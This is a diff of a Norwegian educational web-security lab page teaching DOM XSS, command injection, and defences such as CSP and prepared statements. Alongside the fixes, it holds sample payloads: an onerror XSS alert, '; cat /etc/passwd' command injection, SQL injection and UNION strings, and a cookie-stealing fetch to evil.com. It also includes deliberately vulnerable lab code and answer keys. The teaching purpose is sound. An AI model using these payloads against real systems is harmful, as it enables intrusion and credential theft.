-          <div class="ts-body"><div class="ts-card"><div style="display:flex;gap:8px;margin-top:8px"><input class="ts-input" id="dom-in" placeholder="Navn eller payload..."><button class="ts-btn" style="background:#065f46" onclick="domX()">Vis</button></div><span class="ts-tag vuln-tag" style="margin-top:8px;display:inline-block">innerHTML</span></div>
-          <div id="dom-st" class="lab-status" style="margin-top:8px"><div class="pulse r"></div><span></span></div></div>
-        </div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">09</span>
+  <span class="lab-title">XSS — DOM-basert</span>
+  <div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-4">Nivå 9 — DOM XSS</div>
+<p class="e-hook">Serveren gjør alt riktig. Siden er likevel sårbar 🤯 Feilen bor i JavaScript-en, inne i nettleseren.</p>
+
+<div class="e-spill" data-spill="par" data-tittel="🔗 Hva vises på skjermen?" data-oppgave="Venstre: en linje JavaScript. Høyre: det som skjer på siden.">
+  <div class="pr-par" data-forklar="innerHTML tolker teksten som HTML. &lt;b&gt; blir fet skrift."><span><code>el.innerHTML = "&lt;b&gt;Ola&lt;/b&gt;"</code></span><span><b>Ola</b> i fet skrift</span></div>
+  <div class="pr-par" data-forklar="textContent viser tegnene akkurat som de er."><span><code>el.textContent = "&lt;b&gt;Ola&lt;/b&gt;"</code></span><span>&lt;b&gt;Ola&lt;/b&gt;, tegn for tegn</span></div>
+  <div class="pr-par" data-forklar="innerHTML lager et ekte bilde, og onerror kjører 💥"><span><code>el.innerHTML = '&lt;img src=x onerror=alert(1)&gt;'</code></span><span>💥 En alert-boks spretter opp</span></div>
+  <div class="pr-par" data-forklar="textContent lager ingen elementer. Payloaden blir bare tekst på skjermen."><span><code>el.textContent = '&lt;img src=x onerror=alert(1)&gt;'</code></span><span>😴 Bare teksten vises, ingenting kjører</span></div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>DOM</b> er siden slik JavaScript ser den. <b>DOM-basert XSS</b>: JavaScript i siden henter noe fra adressen og setter det inn med <code>innerHTML</code>. Serveren limer aldri inn payloaden.<br>
+Fiksen: <code>textContent</code> setter inn ren tekst og tolker aldri HTML.
+</div>
+<p class="e-sikker">🙈 Står payloaden etter <code>#</code> i adressen, sendes den ikke engang til serveren. Da finnes den ikke i noen serverlogg.</p>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="cat velkommen.html" data-mal="Se velkomstsiden:"><template class="ut">&lt;h1 id="hei"&gt;Hei!&lt;/h1&gt;
+&lt;script&gt;
+  const navn = new URLSearchParams(<span class="h2">location.search</span>).get("name");
+  document.getElementById("hei").<span class="h1">innerHTML</span> = "Hei, " + navn + "!";
+&lt;/script&gt;</template><template class="forklar"><ul class="e-forklar"><li><span class="m h2"></span><span>biten etter <code>?</code> i adressen</span></li><li><span class="m h1"></span><span>navnet settes inn som HTML. Her er feilen!</span></li></ul><p>Serveren (<code>python3 -m http.server 8000</code>) kjører i en annen fane.</p></template></div>
+<div class="tm-o" data-cmd="curl -s &quot;http://localhost:8000/velkommen.html?name=Ola&quot;" data-alias="curl -s 'http://localhost:8000/velkommen.html?name=Ola'|curl -s &quot;localhost:8000/velkommen.html?name=Ola&quot;" data-mal="Hent siden med <code>?name=Ola</code>, som serveren sender den:"><template class="ut">&lt;h1 id="hei"&gt;<span class="h1">Hei!</span>&lt;/h1&gt;
+&lt;script&gt;
+  const navn = new URLSearchParams(location.search).get("name");
+  document.getElementById("hei").innerHTML = "Hei, " + navn + "!";
+&lt;/script&gt;</template><template class="forklar"><p>Akkurat samme fil. Serveren satte ikke inn «Ola» noe sted. Det gjør JavaScript-en først i nettleseren.</p></template></div>
+<div class="tm-o" data-cmd="curl -s &quot;http://localhost:8000/velkommen.html?name=Ola&quot; | grep -c Ola" data-alias="curl -s 'http://localhost:8000/velkommen.html?name=Ola' | grep -c Ola|curl -s &quot;localhost:8000/velkommen.html?name=Ola&quot; | grep -c Ola" data-mal="Tell linjene med «Ola» i svaret fra serveren." data-skjult data-hint="Kommandoen fra oppdrag 2, og så <code>| grep -c Ola</code> bak. <code>-c</code> = count, tell."><template class="ut"><span class="h1">0</span></template><template class="forklar"><p>Null! Hadde payloaden stått der, ville et filter på serveren kunnet stoppe den. Men den er aldri der 🙈</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="0|null|ingen"><span class="ans-q">Hvor mange linjer med «Ola» var det i svaret fra serveren?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tallet i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">0</div></div></div>
+<div class="ans-row" data-p="1" data-a="innerHTML"><span class="ans-q">Hvilken egenskap bruker velkommen.html for å sette inn navnet?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den gule biten i oppdrag 1.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">innerHTML</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag <code>nano velkommen.html</code> med koden fra oppdrag 1, og start <code>python3 -m http.server 8000</code> i samme mappe. Åpne <code>http://localhost:8000/velkommen.html?name=Ola</code> i Firefox. Bytt så Ola med <code>&lt;img src=x onerror=alert(1)&gt;</code>. Bytt til slutt <code>innerHTML</code> med <code>textContent</code> og prøv igjen 😴<p class="e-win">Windows: <code>python -m http.server 8000</code> og <code>curl.exe -s "http://localhost:8000/velkommen.html?name=Ola"</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="textContent"><span class="ans-q">Hvilken egenskap tolker aldri HTML og fikser derfor DOM-XSS?</span><input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Motstykket til innerHTML, som bare setter inn tekst.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">textcontent</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box"><code>element.textContent = 'Hei, ' + name;</code> — tolker aldri HTML.</div></div>
-      <div class="complete-banner" id="done-web-9"><span>✓</span> Lab 9 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Hva brukte linjene som ga 😴 i par-spillet?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">textcontent</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 10 · COMMAND INJECTION ═══════════════════════ -->
 <div class="lab-card" id="web-10" data-level="hard">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">10</span><span class="lab-title">Command Injection — kontroll over serveren</span><div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-5">Nivå 10 — Command Injection</div>
-      <div class="theory-block"><div class="theory-title">💻 Hva er Command Injection?</div><div class="theory-text"><p>Brukerinput sendes direkte til OS som en kommando. Et ping-verktøy kan misbrukes til å kjøre hvilken som helst OS-kommando.</p></div>
-        <div class="code-block">ping 8.8.8.8<span class="payload">; cat /etc/passwd</span></div>
-      </div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Ping en normal IP</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Injiser <code>8.8.8.8; whoami</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Prøv <code>8.8.8.8; cat /etc/passwd</code></div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">netttool.no/ping</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#1f2937"><span class="ts-logo">🌐 NetTool</span></div><div class="ts-body">
-          <div class="ts-card"><div style="display:flex;gap:8px"><input class="ts-input" id="cmd-in" value="8.8.8.8"><button class="ts-btn" style="background:#1f2937" onclick="cmdI()">Ping</button></div></div>
-          <div class="ts-card" style="background:#0a0c10;margin-top:0"><div id="cmd-out" style="font-family:monospace;font-size:12px;color:#9ca3af;min-height:60px;line-height:1.8">—</div></div>
-          <div id="cmd-st" class="lab-status" style="margin-top:4px"><div class="pulse r"></div><span></span></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">10</span>
+  <span class="lab-title">Command Injection — kontroll over serveren</span>
+  <div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-5">Nivå 10 — Command Injection</div>
+<p class="e-hook">Et nettverktøy lar deg pinge en IP fra serveren 🏓 Ett lite tegn til, og du snakker med selve operativsystemet.</p>
+
+<div class="e-spill" data-spill="rekkefolge" data-tittel="🧩 Hva skjer med 8.8.8.8; whoami?" data-oppgave="Følg payloaden fra skjemaet til skjermen.">
+  <div class="rf-item" data-forklar="Alt starter i et helt vanlig felt.">Angriperen skriver <code>8.8.8.8; whoami</code> i ping-feltet ⌨️</div>
+  <div class="rf-item" data-forklar="Feilen: input limes inn i en kommando-tekst.">Serveren limer det inn: <code>"ping -c 1 " + input</code></div>
+  <div class="rf-item" data-forklar="Skallet får hele teksten som én kommandolinje.">Skallet får <code>ping -c 1 8.8.8.8; whoami</code></div>
+  <div class="rf-item" data-forklar="Først det som står før semikolonet.">Skallet kjører ping 🏓</div>
+  <div class="rf-item" data-forklar="; betyr «og så neste kommando».">Skallet ser <code>;</code> og kjører whoami også</div>
+  <div class="rf-item" data-forklar="Webserveren kjører ofte som brukeren www-data. Nå vet angriperen det.">Siden viser <code>www-data</code> under ping-svaret 😱</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>Command injection</b>: input havner i en kommando til <b>skallet</b> (shell). <code>;</code> skiller to kommandoer. <code>&amp;&amp;</code> og <code>|</code> kan også brukes.<br>
+Kommandoen kjører som brukeren webserveren kjører som, ofte <b>www-data</b>. Derfra kan angriperen lese filer, laste ned verktøy eller åpne et bakdør-skall.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="cat ping.py" data-mal="Se koden til ping-verktøyet:"><template class="ut">import os
+import sys
+
+ip = sys.argv[1]
+<span class="h1">os.system("ping -c 1 " + ip)</span></template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>input limes inn i en tekst som sendes til skallet. Her er feilen!</span></li></ul><p><code>sys.argv[1]</code> er det du skriver etter filnavnet.</p></template></div>
+<div class="tm-o" data-cmd="python3 ping.py 127.0.0.1" data-mal="Ping deg selv, helt vanlig:"><template class="ut">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms</template><template class="forklar"><p>Akkurat som det skal være.</p></template></div>
+<div class="tm-o" data-cmd="python3 ping.py &quot;127.0.0.1; whoami&quot;" data-alias="python3 ping.py '127.0.0.1; whoami'" data-mal="Nå med payload. Anførselstegnene gjør at alt havner i <code>ip</code>:"><template class="ut">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+<span class="h1">kali</span></template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>svaret fra <code>whoami</code>. På en webserver hadde det stått <b>www-data</b></span></li></ul></template></div>
+<div class="tm-o" data-cmd="python3 ping2.py &quot;127.0.0.1; whoami&quot;" data-alias="python3 ping2.py '127.0.0.1; whoami'" data-mal="Prøv samme payload mot den trygge versjonen, <code>ping2.py</code>." data-skjult data-hint="Som oppdrag 3, men med <code>ping2.py</code>."><template class="ut"><span class="h2">ping: 127.0.0.1; whoami: Name or service not known</span></template><template class="forklar"><p><code>ping2.py</code> bruker <code>subprocess.run(["ping", "-c", "1", ip])</code>. Argumentene går som en liste, uten noe skall imellom. Da er <code>;</code> bare et tegn i et rart vertsnavn 🤷</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="kali"><span class="ans-q">Hvilket brukernavn skrev whoami ut i oppdrag 3?</span><input class="ans-in" placeholder="et navn"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den gule linja helt nederst.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">kali</div></div></div>
+<div class="ans-row" data-p="1" data-a="nei"><span class="ans-q">Ble whoami kjørt av ping2.py? ja eller nei</span><input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Står det kali noe sted i oppdrag 4?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">nei</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag <code>nano ping.py</code> med koden fra oppdrag 1, og <code>nano ping2.py</code> med koden under. Kjør de samme kommandoene. Tidene i ping blir litt annerledes. Det er helt riktig!
+<pre class="e-kode">import subprocess
+import sys
+
+ip = sys.argv[1]
+subprocess.run(["ping", "-c", "1", ip])</pre></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="semikolon|;"><span class="ans-q">Hvilket tegn skiller de to kommandoene i payloaden 8.8.8.8; whoami?</span><input class="ans-in" placeholder="ett tegn"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Samme tegn som skiller to setninger i SQL.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">;</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box">CMDi gir tilgang til hele OS — ikke bare databasen. Du kan installere malware eller starte en reverse shell.</div></div>
-      <div class="complete-banner" id="done-web-10"><span>✓</span> Lab 10 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tegnet mellom <code>8.8.8.8</code> og <code>whoami</code> i rekkefølge-spillet. Skriv navnet på tegnet med bokstaver.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">semikolon (;)</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 11 · FORSVAR ═══════════════════════ -->
 <div class="lab-card" id="web-11" data-level="hard">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">11</span><span class="lab-title">HTTP Headers og CSP — forsvar mot injection</span><div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-5">Nivå 11 — Forsvar</div>
-      <div class="theory-block"><div class="theory-title">🛡️ Content Security Policy (CSP)</div><div class="theory-text"><p>CSP forteller nettleseren hvilke script-kilder som er tillatt. Inline scripts blokkeres selv om en angriper injiserer dem.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Bygg din CSP med builderen til høyre</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Hva er prepared statements og hvorfor stopper de SQL Injection?</div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Er CSP nok alene til å stoppe XSS?</div></div>
-      </div>
-      <div class="mini-quiz"><div class="mini-quiz-title">Sluttquiz</div><div class="quiz-q">Hva er det viktigste tiltaket mot SQL Injection?</div><div class="quiz-opts"><button class="quiz-opt" onclick="mq(this,false)">Bruke HTTPS</button><button class="quiz-opt" onclick="mq(this,true)">Parameteriserte spørringer (prepared statements)</button><button class="quiz-opt" onclick="mq(this,false)">Legge til CSP-header</button></div><div class="quiz-fb"></div></div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">CSP Builder</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#1f2937"><span class="ts-logo">🛡 CSP Builder</span></div><div class="ts-body">
-          <div class="ts-card">
-            <div style="display:flex;flex-direction:column;gap:10px">
-              <label style="display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer"><input type="checkbox" id="csp-a" onchange="cspB()" checked> <span><code>default-src 'self'</code></span></label>
-              <label style="display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer"><input type="checkbox" id="csp-b" onchange="cspB()" checked> <span>Blokker inline scripts</span></label>
-              <label style="display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer"><input type="checkbox" id="csp-c" onchange="cspB()"> <span><code>object-src 'none'</code></span></label>
-              <label style="display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer"><input type="checkbox" id="csp-d" onchange="cspB()"> <span><code>upgrade-insecure-requests</code></span></label>
-            </div>
-          </div>
-          <div class="ts-card" style="background:#0a0c10"><div id="csp-out" style="font-family:monospace;font-size:11px;color:#4ade80;line-height:1.9;word-break:break-all"></div></div>
-          <div id="csp-an" style="margin-top:8px"></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">11</span>
+  <span class="lab-title">HTTP Headers og CSP — forsvar mot injection</span>
+  <div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-5">Nivå 11 — Forsvar</div>
+<p class="e-hook">Nok angrep 🛡️ Nå bytter du side. Hvert angrep har sitt eget skjold. Velg riktig!</p>
+
+<div class="e-spill" data-spill="lyn" data-tittel="⚡ Hvilket skjold?" data-knapper="🧷 Prepared statements|🛡️ CSP|🔒 HTTPS">
+  <div class="ly-item" data-svar="0" data-hvorfor="SQL injection stoppes i databaselaget. Med ? som plassholder blir input alltid data.">Noen skriver <code>' OR '1'='1' --</code> i innloggingen</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="CSP kan si «ingen script skrevet rett i siden». Da nekter nettleseren å kjøre det.">Et <code>&lt;script&gt;</code> har sneket seg inn i en kommentar</div>
+  <div class="ly-item" data-svar="2" data-hvorfor="HTTPS krypterer trafikken. Da ser naboen på wifien bare rot.">Noen på kafé-wifien leser passordet på vei til serveren ☕</div>
+  <div class="ly-item" data-svar="0" data-hvorfor="UNION er også SQL injection. Samme skjold.">Noen skriver <code>1' UNION SELECT username, password FROM users --</code></div>
+  <div class="ly-item" data-svar="1" data-hvorfor="CSP lister hvilke steder script får hentes fra. ond.example står ikke på lista.">Et injisert script prøver å hente kode fra ond.example</div>
+  <div class="ly-item" data-svar="2" data-hvorfor="Cookien reiser over nettet. Kryptert trafikk kan ikke leses underveis.">Noen avlytter nettet på flyplassen og plukker opp cookien din ✈️</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>Prepared statements</b> (parameteriserte spørringer): SQL-en sendes med <code>?</code> som plassholder, og verdiene sendes for seg. Da blir input aldri SQL.<br>
+<b>CSP</b> (<code>Content-Security-Policy</code>) er en <b>header</b> i svaret fra serveren. Den sier hvilke script nettleseren får kjøre. Et ekstra lag mot XSS, ikke en erstatning for escaping.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="cat login.py" data-mal="Se to måter å spørre databasen på:"><template class="ut">import sqlite3
+
+db = sqlite3.connect("bank.db")
+bruker = "' OR '1'='1' --"
+
+# Farlig: input limes rett inn i SQL-en
+<span class="h1">sql = f"SELECT username FROM users WHERE username='{bruker}'"</span>
+print("Limt inn:", db.execute(sql).fetchall())
+
+# Trygt: ? er en plassholder, verdien sendes for seg
+<span class="h3">sql = "SELECT username FROM users WHERE username=?"</span>
+print("Prepared:", db.execute(sql, <span class="h3">(bruker,)</span>).fetchall())</template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>f-streng: payloaden blir en del av SQL-en</span></li><li><span class="m h3"></span><span><code>?</code> i SQL-en, og verdien sendt ved siden av</span></li></ul><p>Samme <code>bank.db</code> som i oppgave 4.</p></template></div>
+<div class="tm-o" data-cmd="python3 login.py" data-mal="Kjør begge:"><template class="ut">Limt inn: <span class="h1">[('admin',), ('lars',), ('kari',)]</span>
+Prepared: <span class="h3">[]</span></template><template class="forklar"><p>Limt inn: alle brukerne 😱 Prepared: ingen. Databasen lette etter en bruker som bokstavelig talt heter <code>' OR '1'='1' --</code>. Den finnes ikke 🧷</p></template></div>
+<div class="tm-o" data-cmd="curl -I http://localhost:8000/" data-alias="curl -I localhost:8000|curl -I http://localhost:8000|curl -I localhost:8000/" data-mal="Har test-serveren din en CSP-header? Se bare på headerne." data-skjult data-hint="<code>curl</code> med stor <code>-I</code> viser bare headerne. Adressen er <code>http://localhost:8000/</code>."><template class="ut">HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.13.16
+Date: Wed, 07 Oct 2026 18:30:48 GMT
+Content-type: text/html; charset=utf-8
+Content-Length: 898</template><template class="forklar"><p>Fem linjer, og ingen av dem heter <code>Content-Security-Policy</code>. Denne serveren har altså ingen CSP. En ekte nettside bør sende noe sånt som <code>Content-Security-Policy: default-src 'self'</code>.</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="0|null|ingen"><span class="ans-q">Hvor mange brukere fant prepared-versjonen?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den grønne lista i oppdrag 2. Hvor mange navn står i <code>[]</code>?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">0</div></div></div>
+<div class="ans-row" data-p="1" data-a="nei"><span class="ans-q">Sendte test-serveren en Content-Security-Policy-header? ja eller nei</span><input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Les de fem linjene i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">nei</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag <code>nano login.py</code> med koden fra oppdrag 1, i samme mappe som <code>bank.db</code> fra oppgave 4. Start <code>python3 -m http.server 8000</code> i en annen fane før du kjører <code>curl -I</code>.<p class="e-win">Windows: <code>python login.py</code> og <code>curl.exe -I http://localhost:8000/</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="prepared statements"><span class="ans-q">Hva heter teknikken som stopper SQL Injection i databaselaget?</span><input class="ans-in" placeholder="to ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Spørringen planlegges f&oslash;rst, verdiene sendes etterp&aring;.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">prepared statements</div></div></div>
-        </div>
-
-      <div class="complete-banner" id="done-web-11"><span>✓</span> Lab 11 fullført — modul komplett!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Skjoldet 🧷 i lynrunden, og linja «Prepared:» i oppdrag 2.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">prepared statements</div></div></div>
+</div>
+</div></div>
 </div>
 
-  </div>
-  <div style="margin-top:40px;display:flex;gap:12px;flex-wrap:wrap">
-    <a href="https://cybersikkerhet-gokstad.github.io/CyberLab/labber.html" class="btn btn-ghost">← Labber</a>
-  </div>
 </div>
 
-<footer class="footer"><div class="container"><div class="footer-inner"><span>CyberLab</span><span><a href="https://cybersikkerhet-gokstad.github.io/CyberLab/index.html">← Hjem</a></span></div></div></footer>
+<div style="margin-top:36px"><a href="https://cybersikkerhet-gokstad.github.io/CyberLab/labber.html" class="btn btn-ghost">&larr; Labber</a></div>
+</div>
 
+<footer class="footer"><div class="container"><div class="footer-inner">
+  <span>CyberLab &mdash; Fagskole Informasjonssikkerhet</span><span>Gratis &amp; &aring;pen kildekode</span>
+</div></div></footer>
 <script src="../js/cyberlab.js?v=13"></script>
-<script>
-function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
-function mq(btn,ok){btn.closest('.quiz-opts').querySelectorAll('.quiz-opt').forEach(o=>o.disabled=true);btn.classList.add(ok?'correct':'wrong');var fb=btn.closest('.mini-quiz').querySelector('.quiz-fb');fb.classList.add('show');fb.style.color=ok?'var(--green)':'var(--red)';fb.textContent=ok?'✓ Riktig!':'✗ Ikke helt.';}
-function updatePreview(){document.getElementById('html-preview').innerHTML=document.getElementById('html-editor').value;}
-function ciaEx(t){var el=document.getElementById('cia-result');el.style.display='block';var m={c:{bg:'rgba(75,142,255,.1)',br:'rgba(75,142,255,.3)',col:'#60a5fa',txt:'🔵 Konfidensialitet brutt — passord er hemmelig data som nå er tilgjengelig for uvedkommende.'},i:{bg:'rgba(0,229,160,.1)',br:'rgba(0,229,160,.3)',col:'#4ade80',txt:'🟢 Integritet brutt — data endres uten tillatelse.'},a:{bg:'rgba(255,181,71,.1)',br:'rgba(255,181,71,.3)',col:'#fbbf24',txt:'🟡 Tilgjengelighet brutt — DROP TABLE sletter all data permanent.'}};var x=m[t];el.style.background=x.bg;el.style.border='1px solid '+x.br;el.style.color=x.col;el.textContent=x.txt;}
-function injT(t){['sql','xss','cmd'].forEach(function(i){document.getElementById('inj-'+i).style.background='#6b7280';});var c={sql:'#dc2626',xss:'#b91c1c',cmd:'#92400e'};document.getElementById('inj-'+t).style.background=c[t];var h={sql:'<div class="ts-card"><div class="ts-card-title">SQL Injection</div><div style="background:#f0fdf4;border:1px solid #86efac;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#166534;margin-bottom:8px">ola.nordmann</div><div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#991b1b;margin-bottom:8px">\' OR \'1\'=\'1</div><div style="background:#1a1a2e;border-radius:5px;padding:8px;font-family:monospace;font-size:11px;color:#e2e8f0">WHERE username = <span style="color:#f87171">\'\' OR \'1\'=\'1\'</span></div><div style="font-size:11px;color:#dc2626;margin-top:6px;font-weight:600">→ Alltid sant!</div></div>',xss:'<div class="ts-card"><div class="ts-card-title">XSS</div><div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#991b1b">&lt;script&gt;fetch(\'evil.com?c=\'+document.cookie)&lt;/script&gt;</div><div style="font-size:11px;color:#dc2626;margin-top:6px;font-weight:600">→ Cookie sendt til angriper!</div></div>',cmd:'<div class="ts-card"><div class="ts-card-title">Command Injection</div><div style="background:#1a1a2e;border-radius:5px;padding:8px;font-family:monospace;font-size:11px;color:#e2e8f0;margin-bottom:8px">os.system("ping "+user_input)</div><div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#991b1b">8.8.8.8; cat /etc/passwd</div><div style="font-size:11px;color:#dc2626;margin-top:6px;font-weight:600">→ Passordfilen leses!</div></div>'};document.getElementById('inj-content').innerHTML=h[t];}
